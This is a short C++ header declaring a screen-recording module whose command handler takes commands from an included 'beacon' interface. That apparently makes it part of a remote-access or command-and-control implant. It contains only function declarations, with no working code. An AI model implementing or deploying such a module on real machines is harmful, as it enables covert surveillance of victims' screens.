#pragma once
#include "../beacon.h"

namespace ScreenRecorder {
    void Start(const std::string& params); // params: {"duration": 60, "fps": 10, "quality": 80}
    void Stop();
    void OnCommand(const Beacon::Command& cmd);
    bool IsRecording();
}